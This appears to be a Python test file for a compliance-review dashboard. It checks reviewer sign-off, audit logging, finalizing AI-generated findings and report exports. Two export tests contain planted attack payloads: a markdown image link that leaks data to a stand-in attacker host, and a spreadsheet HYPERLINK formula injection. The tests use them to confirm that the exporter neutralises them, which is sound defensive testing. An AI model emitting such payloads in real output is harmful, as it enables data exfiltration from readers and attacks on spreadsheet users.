"""Human-in-the-loop rules, finalizing, and the exported report."""

import csv
import io
import json
import re

import pytest

from phase3_dashboard.core import analysis, review
from phase3_dashboard.core.report import build_report, to_csv, to_json, to_markdown

REVIEWER = "Mahsa Sheikhi"


def first(session, coverage):
    return next(f for f in session.findings if f.coverage == coverage)


def decide_all(session, reviewer=REVIEWER):
    for finding in session.findings:
        if finding.status == "pending":
            review.approve(session, finding.finding_id, reviewer)


def test_every_decision_needs_a_named_reviewer(sample_session):
    finding = sample_session.findings[0]
    for name in ("", "   ", None, "x" * 81):
        with pytest.raises(review.ReviewError):
            review.approve(sample_session, finding.finding_id, name)
    assert finding.status == "pending"


def test_reject_needs_a_reason(sample_session):
    finding = sample_session.findings[0]
    with pytest.raises(review.ReviewError):
        review.reject(sample_session, finding.finding_id, REVIEWER, "no")
    review.reject(sample_session, finding.finding_id, REVIEWER, "Outside this policy's scope")
    assert finding.status == "rejected" and finding.reviewer_note == "Outside this policy's scope"


def test_invalid_findings_can_be_rejected_but_not_approved(sample_session):
    finding = sample_session.findings[0]
    finding.problems.append("Coverage 'Mostly' isn't allowed.")
    with pytest.raises(review.ReviewError):
        review.approve(sample_session, finding.finding_id, REVIEWER)
    review.reject(sample_session, finding.finding_id, REVIEWER, "Malformed agent output")


def test_editing_a_recommendation_is_recorded(sample_session):
    finding = first(sample_session, "Partial")
    with pytest.raises(review.ReviewError):  # a gap can't lose its recommendation
        review.approve(sample_session, finding.finding_id, REVIEWER, edited_recommendation="   ")
    review.approve(sample_session, finding.finding_id, REVIEWER, edited_recommendation="Review accounts every 90 days.")
    assert finding.final_recommendation == "Review accounts every 90 days."
    event = sample_session.audit_log[-1]
    assert event.action == "approved_with_edits"
    assert event.detail["recommendation_before"] == finding.recommendation


def test_unchanged_text_is_not_an_edit(sample_session):
    finding = first(sample_session, "Partial")
    review.approve(sample_session, finding.finding_id, REVIEWER, edited_recommendation=finding.recommendation + "  ")
    assert finding.recommendation_edited is None
    assert sample_session.audit_log[-1].action == "approved"


def test_decisions_can_be_undone_until_finalized(sample_session):
    finding = sample_session.findings[0]
    review.approve(sample_session, finding.finding_id, REVIEWER)
    with pytest.raises(review.ReviewError):
        review.approve(sample_session, finding.finding_id, REVIEWER)  # already decided
    review.reopen(sample_session, finding.finding_id, "Second Reviewer")
    assert finding.status == "pending" and finding.reviewer is None
    assert [e.action for e in sample_session.audit_log] == ["approved", "reopened"]


def test_finalize_waits_for_every_decision(sim_backend, sample_session):
    ok, reason = review.can_finalize(sample_session, REVIEWER)
    assert not ok and "still need a decision" in reason
    with pytest.raises(review.ReviewError):
        analysis.finalize_review(sim_backend, sample_session, REVIEWER)


def test_finalize_resumes_each_thread_with_only_its_approved_findings(sim_backend, sample_session):
    rejected = first(sample_session, "Missing")
    review.reject(sample_session, rejected.finding_id, REVIEWER, "Not applicable here")
    edited = first(sample_session, "Partial")
    review.approve(sample_session, edited.finding_id, REVIEWER, edited_recommendation="Edited text.")
    decide_all(sample_session)

    sent = {}
    original_submit = sim_backend.submit_review

    def spy(thread_id, approved):
        sent[thread_id] = approved
        return original_submit(thread_id, approved)

    sim_backend.submit_review = spy
    assert analysis.finalize_review(sim_backend, sample_session, REVIEWER) == []
    assert sample_session.finalized and sample_session.finalized_by == REVIEWER
    assert set(sent) == set(sample_session.run.ok_threads)  # threads with zero findings resume too
    approved = [item for items in sent.values() for item in items]
    assert len(approved) == len(sample_session.findings) - 1
    assert all(item["status"] == "approved" and item["reviewer"] == REVIEWER for item in approved)
    resumed_edit = next(i for i in approved if i["requirement"] == edited.requirement)
    assert resumed_edit["recommendation"] == "Edited text."
    assert resumed_edit["recommendation_ai_original"] == edited.recommendation

    with pytest.raises(review.ReviewError):  # locked after finalizing
        review.reopen(sample_session, edited.finding_id, REVIEWER)


def test_a_failed_resume_is_retried_without_repeating_successful_threads(sim_backend, sample_session):
    decide_all(sample_session)
    calls = []
    original_submit = sim_backend.submit_review

    def flaky(thread_id, approved):
        calls.append(thread_id)
        if len(calls) == 2:
            raise ConnectionError("checkpoint store unavailable")
        return original_submit(thread_id, approved)

    sim_backend.submit_review = flaky
    errors = analysis.finalize_review(sim_backend, sample_session, REVIEWER)
    assert len(errors) == 1 and not sample_session.finalized
    first_pass = len(calls)
    assert analysis.finalize_review(sim_backend, sample_session, REVIEWER) == []
    assert sample_session.finalized
    assert len(calls) == first_pass + 1  # only the failed thread ran again


def finalized(sim_backend, session):
    review.reject(session, session.findings[0].finding_id, REVIEWER, "Duplicate of another finding")
    decide_all(session)
    assert analysis.finalize_review(sim_backend, session, REVIEWER) == []
    return build_report(session)


def test_report_requires_a_finalized_review(sample_session):
    with pytest.raises(ValueError):
        build_report(sample_session)


def test_report_contains_only_approved_findings(sim_backend, sample_session):
    report = finalized(sim_backend, sample_session)
    ids = {f["id"] for f in report["approved_findings"]}
    assert sample_session.findings[0].finding_id not in ids
    assert len(ids) == len(sample_session.findings) - 1
    assert report["simulated"] is True and report["framework"]["version"] == "5.2.0"
    assert [e["action"] for e in report["audit_log"]][-1] == "finalized"
    json.loads(to_json(report))


def test_markdown_export_neutralizes_model_text(sim_backend, sample_session):
    target = sample_session.findings[1]
    target.finding = "![leak](https://attacker.example/x.png?d=secret) <img src=x> | broken | table"
    markdown = to_markdown(finalized(sim_backend, sample_session))
    assert "![leak](" not in markdown
    assert not re.search(r"(?<!\\)<img", markdown)
    assert r"!\[leak\](https://attacker.example" in markdown
    assert "SIMULATED DATA" in markdown


def test_csv_export_blocks_spreadsheet_formulas(sim_backend, sample_session):
    sample_session.findings[1].finding = '=HYPERLINK("https://attacker.example","click")'
    rows = list(csv.DictReader(io.StringIO(to_csv(finalized(sim_backend, sample_session)))))
    assert rows[0]["finding"].startswith("'=")
    assert {"id", "coverage", "framework_control", "source", "reviewer"} <= set(rows[0])
